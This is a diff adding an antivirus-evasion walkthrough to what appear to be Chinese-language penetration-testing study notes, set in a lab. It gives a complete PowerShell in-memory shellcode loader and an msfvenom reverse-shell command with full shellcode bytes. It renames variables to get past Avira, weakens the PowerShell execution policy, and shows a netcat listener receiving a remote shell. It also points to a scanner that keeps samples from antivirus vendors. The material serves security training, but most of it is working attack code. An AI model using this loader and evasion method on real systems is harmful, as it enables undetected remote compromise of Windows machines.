@@ -2819,3 +2819,208 @@ In-Memory Injections,1 also known as PE Injection.\
 rootkit 常使用 Hooking 技巧，rootkit 是一種非常隱蔽的惡意程式，目的是透過改變系統的運作方式，讓駭客能持續、隱秘地控制目標電腦。它可以修改系統的不同層面，透過漏洞提權或利用已經有高權的程式來安裝。
 
 這樣的技術讓 rootkit 可以在系統中運行，難以被發現。它可以用來監控系統、竊取資料或操控電腦的運作。
+
+### AV Evasion Example
+
+>[!Note]
+> 1. 若將 malware 丟給 VirusTotal 分析，平台會將樣本發送給每個會員資格的防毒供應商。代表上傳不久，多數防毒軟體就會有 detection signatures。\
+> `替代方案`：[AntiScan.Me](https://antiscan.me/)\
+> This service scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties. 一天提供四次免費掃描
+> 2. Windows Defender 的 Automatic Sample Submission (自動提交樣本) 會透過 ML cloud engines 分析樣本。
+
+
+#### - Evading AV with Thread Injection
+Finding a universal solution to bypass all antivirus products is difficult and time consuming, if not impossible.\
+Example:\
+`Avira Free Security` version 1.1.68.29553 on our `Windows 11` client.\
+Security panel > Protection Options\
+![image](https://hackmd.io/_uploads/B1a-XADDye.png)
+> 顯示正在運行的保護措施
+
+1. 測試 AV 是否 working
+use the `Metasploit payload` we generated earlier and scan it with Avira.
+![image](https://hackmd.io/_uploads/H13FQRDvyx.png)
+> blocked
+2. 借助 PowerShell 來 bypass antivirus products
+3. remote process memory injection technique
+case: x86 PowerShell interpreter.\
+PowerShell 強大的功能是能夠與 Windows API 互動\
+>[!Important]
+> 即使腳本會被標記為惡意，它也可以被更改。防毒軟體通常會檢查 variable names, comments, and logic，但這些都可以更改。
+
+4. 執行 in-memory injection 的基本模板化腳本
+```powershell
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$winFunc = 
+  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+# C# 編譯並動態加入 PowerShell，Add-Type 會將定義的函數載入至 PowerShell 環境
+
+[Byte[]];
+[Byte[]]$sc = <place your shellcode here>;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+# 創建一個執行緒，執行剛剛分配的記憶體地址（即殼碼）。
+```
+> `VirtualAlloc`：`kernel32.dll` 匯入，分配一塊記憶體空間。\
+`CreateThread`：`kernel32.dll` 匯入，創建一個執行緒。\
+`memset`： `msvcrt.dll` 匯入，用於設置記憶體區塊的值。\
+`$sc`： 字節陣列，用來存放殼碼。\
+`$size`：設定記憶體區塊大小，預設為 4KB (0x1000)，如果殼碼大小超過 4KB，則動態調整為殼碼長度。\
+`VirtualAlloc`：分配一塊可執行（0x40）且可讀寫（0x3000）的記憶體。
+`memset`：透過迴圈，將殼碼的每一個 byte 寫入目標記憶體。\
+
+從 kernel32.dll 匯入 [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) 和 [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) ，以及從 msvcrt.dll匯入memset。這些函數將允許分別分配記憶體、建立執行緒以及將任意資料寫入分配的記憶體。、
+首先使用 VirtualAlloc 分配一個記憶體區塊，該記憶體區塊取得儲存在 `$sc` 位元組數組中的有效負載的每個位元組，並使用 memset 寫入新分配的記憶體區塊。最後使用 reateThread AP 在記憶體中寫入的有效負載。
+5. msfvenom 產生有效附載
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+...
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 699 bytes
+Final size of powershell file: 3454 bytes
+[Byte[]] $sc =  0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
+...
+```
+完整腳本:
+```powershell
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+Antiscan.Me不支援ps1格式。根據 VirusTotal 掃描的結果，59 個 AV 產品中有 28 個將我們的腳本標記為惡意，其中包括 Avira。
+![image](https://hackmd.io/_uploads/HyOxqAwwyg.png)
+
+防毒通常根據 variables 或 function names 判斷，所以嘗試更改 variables
+
+6. 更改變數名稱
+```powershell
+$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
+
+[Byte[]];   
+[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
+...
+
+$size = 0x1000;
+
+if ($var1.Length -gt 0x1000) {$size = $var1.Length};
+
+$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
+
+$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+> Add-Type cmdlet 的 Win32 硬編碼類別名稱更改: `iWin32`\
+> sc 和 winFunc 分別重新命名為 `var1`和 `var2`
+
+ Avira 掃瞄通過，由於 msfvenom 有效負載適用於 x86，因此我們將啟動 x86 版本的 PowerShell
+ 
+7. 執行 x86 腳本
+```
+PS C:\Users\CHW\Desktop> .\bypass.ps1
+.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
+system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ .\bypass.ps1
++ ~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+```
+> error that references the Execution Policies of our system
+ 
+>[!caution]
+> much like anything in Windows, the PowerShell Execution Policy settings can be dictated by one or more `Active Directory GPOs`. In those cases, it may be necessary to search for additional bypass vectors.
+
+透過 Get-ExecutionPolicy -Scope CurrentUser指令檢索目前執行策略，然後透過Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser指令將其設為Unrestricted。
+```
+PS C:\Users\CHW\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+Undefined
+
+PS C:\Users\CHW\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help Module at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
+
+PS C:\Users\CHW\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+Unrestricted
+```
+(On powershell x86)
+```
+PS C:\Users\CHW\Desktop> .\bypass.ps1
+
+IsPublic IsSerial Name                                     BaseType
+-------- -------- ----                                     --------
+True     True     Byte[]                                   System.Array
+124059648
+124059649
+...
+```
+
+(On kali)
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec>whoami
+whoami
+client01\offsec
+
+C:\Users\offsec>hostname
+hostname
+client01
+
+```
+避開了 Avira 偵測，但也可能被 EDR systems 偵測並通報 SOC team
+
+#### rootkit
+rootkit 常使用 Hooking 技巧，rootkit 是一種非常隱蔽的惡意程式，目的是透過改變系統的運作方式，讓駭客能持續、隱秘地控制目標電腦。它可以修改系統的不同層面，透過漏洞提權或利用已經有高權的程式來安裝。
+
+這樣的技術讓 rootkit 可以在系統中運行，難以被發現。它可以用來監控系統、竊取資料或操控電腦的運作。
